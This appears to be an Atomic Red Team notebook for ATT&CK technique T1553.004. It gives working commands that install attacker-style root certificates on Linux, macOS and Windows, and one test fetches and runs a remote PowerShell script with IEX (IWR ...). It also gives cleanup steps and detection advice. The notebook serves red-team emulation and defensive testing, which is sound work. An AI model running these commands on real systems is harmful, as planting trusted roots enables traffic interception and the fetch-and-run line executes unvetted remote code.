{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "47195bda",
   "metadata": {},
   "source": "# T1553.004 - Install Root Certificate\nAdversaries may install a root certificate on a compromised system to avoid warnings when connecting to adversary controlled web servers. Root certificates are used in public key cryptography to identify a root certificate authority (CA). When a root certificate is installed, the system or application will trust certificates in the root's chain of trust that have been signed by the root certificate.(Citation: Wikipedia Root Certificate) Certificates are commonly used for establishing secure TLS/SSL communications within a web browser. When a user attempts to browse a website that presents a certificate that is not trusted an error message will be displayed to warn the user of the security risk. Depending on the security settings, the browser may not allow the user to establish a connection to the website.\n\nInstallation of a root certificate on a compromised system would give an adversary a way to degrade the security of that system. Adversaries have used this technique to avoid security warnings prompting users when compromised systems connect over HTTPS to adversary controlled web servers that spoof legitimate websites in order to collect login credentials.(Citation: Operation Emmental)\n\nAtypical root certificates have also been pre-installed on systems by the manufacturer or in the software supply chain and were used in conjunction with malware/adware to provide [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) capability for intercepting information transmitted over secure TLS/SSL communications.(Citation: Kaspersky Superfish)\n\nRoot certificates (and their associated chains) can also be cloned and reinstalled. Cloned certificate chains will carry many of the same metadata characteristics of the source and can be used to sign malicious code that may then bypass signature validation tools (ex: Sysinternals, antivirus, etc.) used to block execution and/or uncover artifacts of Persistence.(Citation: SpectorOps Code Signing Dec 2017)\n\nIn macOS, the Ay MaMi malware uses <code>/usr/bin/security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain /path/to/malicious/cert</code> to install a malicious certificate as a trusted root certificate into the system keychain.(Citation: objective-see ay mami 2018)"
  },
  {
   "cell_type": "markdown",
   "id": "da403de7",
   "metadata": {},
   "source": "## Atomic Tests"
  },
  {
   "cell_type": "markdown",
   "id": "9e95647f",
   "metadata": {},
   "source": [
    "### Atomic Test #1 - Install root CA on CentOS/RHEL",
    "Creates a root CA with openssl\n",
    "**Supported Platforms:** linux",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `sh`\n",
    "```sh\nopenssl genrsa -out rootCA.key 4096\nopenssl req -x509 -new -nodes -key rootCA.key -sha256 -days 365 -subj \"/C=US/ST=Denial/L=Springfield/O=Dis/CN=www.example.com\" -out rootCA.crt\ncp rootCA.crt /etc/pki/ca-trust/source/anchors/\nupdate-ca-trust\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f3b269b1",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1553.004 -TestNumbers 1"
  },
  {
   "cell_type": "markdown",
   "id": "4e4253d4",
   "metadata": {},
   "source": "#### Cleanup: \n```sh\nrm /etc/pki/ca-trust/source/anchors/rootCA.crt\nupdate-ca-trust\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "9194645d",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1553.004 -TestNumbers 1 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "6d7681d6",
   "metadata": {},
   "source": "### Atomic Test #2 - Install root CA on Debian/Ubuntu\nCreates a root CA with openssl\n\n**Supported Platforms:** linux\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `sh`!\n##### Description: Verify the certificate exists. It generates if not on disk.\n\n##### Check Prereq Commands:\n```sh\nif [ -f rootCA.crt ]; then exit 0; else exit 1; fi;\n\n```\n##### Get Prereq Commands:\n```sh\nif [ ! -f rootCA.key ]; then openssl genrsa -out rootCA.key 4096; fi;\nopenssl req -x509 -new -nodes -key rootCA.key -sha256 -days 365 -subj \"/C=US/ST=Denial/L=Springfield/O=Dis/CN=www.example.com\" -out rootCA.crt\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "2e567d9e",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1553.004 -TestNumbers 2 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "7019c4ba",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `sh`\n",
    "```sh\nmv rootCA.crt /usr/local/share/ca-certificates\necho sudo update-ca-certificates\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "7a234440",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1553.004 -TestNumbers 2"
  },
  {
   "cell_type": "markdown",
   "id": "62f4c8a8",
   "metadata": {},
   "source": "### Atomic Test #3 - Install root CA on macOS\nCreates a root CA with openssl\n\n**Supported Platforms:** macos\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `sh`!\n##### Description: Verify the certificate exists. It generates if not on disk.\n\n##### Check Prereq Commands:\n```sh\nif [ -f rootCA.crt ]; then exit 0; else exit 1; fi;\n\n```\n##### Get Prereq Commands:\n```sh\nif [ ! -f rootCA.key ]; then openssl genrsa -out rootCA.key 4096; fi;\nopenssl req -x509 -new -nodes -key rootCA.key -sha256 -days 365 -subj \"/C=US/ST=Denial/L=Springfield/O=Dis/CN=www.example.com\" -out rootCA.crt\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "67830614",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1553.004 -TestNumbers 3 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "07e83d48",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `sh`\n",
    "```sh\nsudo security add-trusted-cert -d -r trustRoot -k \"/Library/Keychains/System.keychain\" \"rootCA.crt\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "5bcc0150",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1553.004 -TestNumbers 3"
  },
  {
   "cell_type": "markdown",
   "id": "f688d4ae",
   "metadata": {},
   "source": "### Atomic Test #4 - Install root CA on Windows\nCreates a root CA with Powershell\n\n**Supported Platforms:** windows\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `powershell`!\n##### Description: Verify the certificate exists. It generates if not on disk.\n\n##### Check Prereq Commands:\n```powershell\nif (Test-Path rootCA.cer) { exit 0 } else { exit 1 }\n\n```\n##### Get Prereq Commands:\n```powershell\n$cert = New-SelfSignedCertificate -DnsName atomicredteam.com -CertStoreLocation cert:\\LocalMachine\\My\nExport-Certificate -Type CERT -Cert  Cert:\\LocalMachine\\My\\$($cert.Thumbprint) -FilePath rootCA.cer\nGet-ChildItem Cert:\\LocalMachine\\My\\$($cert.Thumbprint) | Remove-Item\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "2bfdbb9f",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1553.004 -TestNumbers 4 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "9f0d901a",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n$cert = Import-Certificate -FilePath rootCA.cer -CertStoreLocation Cert:\\LocalMachine\\My\nMove-Item -Path $cert.PSPath -Destination \"Cert:\\LocalMachine\\Root\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "288ec975",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1553.004 -TestNumbers 4"
  },
  {
   "cell_type": "markdown",
   "id": "46ff752e",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\ntry {\n   $cert = Import-Certificate -FilePath rootCA.cer -CertStoreLocation Cert:\\LocalMachine\\My -ErrorAction Ignore\n   Get-ChildItem Cert:\\LocalMachine\\My\\$($cert.Thumbprint) -ErrorAction Ignore | Remove-Item -ErrorAction Ignore\n   Get-ChildItem Cert:\\LocalMachine\\Root\\$($cert.Thumbprint) -ErrorAction Ignore | Remove-Item -ErrorAction Ignore\n}\ncatch { }\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "25cc0252",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1553.004 -TestNumbers 4 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "4267c7f3",
   "metadata": {},
   "source": "### Atomic Test #5 - Install root CA on Windows with certutil\nCreates a root CA with certutil\n\n**Supported Platforms:** windows\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `powershell`!\n##### Description: Certificate must exist at specified location (#{pfx_path})\n\n##### Check Prereq Commands:\n```powershell\nif (Test-Path $env:Temp\\rootCA2.cer) { exit 0 } else { exit 1 }\n\n```\n##### Get Prereq Commands:\n```powershell\n$cert = New-SelfSignedCertificate -DnsName atomicredteam.com -CertStoreLocation cert:\\LocalMachine\\My\nExport-Certificate -Type CERT -Cert  Cert:\\LocalMachine\\My\\$($cert.Thumbprint) -FilePath $env:Temp\\rootCA2.cer\nGet-ChildItem Cert:\\LocalMachine\\My\\$($cert.Thumbprint) | Remove-Item\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "992997a7",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1553.004 -TestNumbers 5 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "4bac724f",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\ncertutil -addstore my $env:Temp\\rootCA2.cer\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "dbcbe767",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1553.004 -TestNumbers 5"
  },
  {
   "cell_type": "markdown",
   "id": "59145870",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\ntry {\n$cert = Import-Certificate -FilePath $env:Temp\\rootCA2.cer -CertStoreLocation Cert:\\LocalMachine\\My\nGet-ChildItem Cert:\\LocalMachine\\My\\$($cert.Thumbprint) -ErrorAction Ignore | Remove-Item -ErrorAction Ignore\nGet-ChildItem Cert:\\LocalMachine\\Root\\$($cert.Thumbprint) -ErrorAction Ignore | Remove-Item -ErrorAction Ignore\n} catch { }\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "87cf1edb",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1553.004 -TestNumbers 5 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "6bf18f0c",
   "metadata": {},
   "source": [
    "### Atomic Test #6 - Add Root Certificate to CurrentUser Certificate Store",
    "The following Atomic test simulates adding a generic non-malicious certificate to the CurrentUser certificate store. This behavior generates a registry modification that adds the cloned root CA certificate in the keys outlined in the blog.\nKeys will look like - \\SystemCertificates\\CA\\Certificates or \\SystemCertificates\\Root\\Certificates\nReference: https://posts.specterops.io/code-signing-certificate-cloning-attacks-and-defenses-6f98657fc6ec\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nIEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1553.004/src/RemoteCertTrust.ps1' -UseBasicParsing) \n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b8012ad2",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1553.004 -TestNumbers 6"
  },
  {
   "cell_type": "markdown",
   "id": "6a5cf055",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nGet-ChildItem -Path Cert:\\ -Recurse | Where-Object { $_.Thumbprint -eq '1F3D38F280635F275BE92B87CF83E40E40458400' } | remove-item \n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "c8b3aaa1",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1553.004 -TestNumbers 6 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "8dfa244a",
   "metadata": {},
   "source": "## Detection\nA system's root certificates are unlikely to change frequently. Monitor new certificates installed on a system that could be due to malicious activity.(Citation: SpectorOps Code Signing Dec 2017) Check pre-installed certificates on new systems to ensure unnecessary or suspicious certificates are not present. Microsoft provides a list of trustworthy root certificates online and through authroot.stl.(Citation: SpectorOps Code Signing Dec 2017) The Sysinternals Sigcheck utility can also be used (<code>sigcheck[64].exe -tuv</code>) to dump the contents of the certificate store and list valid certificates not rooted to the Microsoft Certificate Trust List.(Citation: Microsoft Sigcheck May 2017)\n\nInstalled root certificates are located in the Registry under <code>HKLM\\SOFTWARE\\Microsoft\\EnterpriseCertificates\\Root\\Certificates\\</code> and <code>[HKLM or HKCU]\\Software[\\Policies\\]\\Microsoft\\SystemCertificates\\Root\\Certificates\\</code>. There are a subset of root certificates that are consistent across Windows systems and can be used for comparison:(Citation: Tripwire AppUNBlocker)\n\n* 18F7C1FCC3090203FD5BAA2F861A754976C8DD25\n* 245C97DF7514E7CF2DF8BE72AE957B9E04741E85\n* 3B1EFD3A66EA28B16697394703A72CA340A05BD5\n* 7F88CD7223F3C813818C994614A89C99FA3B5247\n* 8F43288AD272F3103B6FB1428485EA3014C0BCFE\n* A43489159A520F0D93D032CCAF37E7FE20A8B419\n* BE36A4562FB2EE05DBB3D32323ADF445084ED656\n* CDD4EEAE6000AC7F40C3802C171E30148030C072"
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (PowerShell)",
   "language": "PowerShell",
   "name": ".net-powershell"
  },
  "language_info": {
   "file_extension": ".ps1",
   "mimetype": "text/x-powershell",
   "name": "PowerShell",
   "pygments_lexer": "powershell",
   "version": "7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}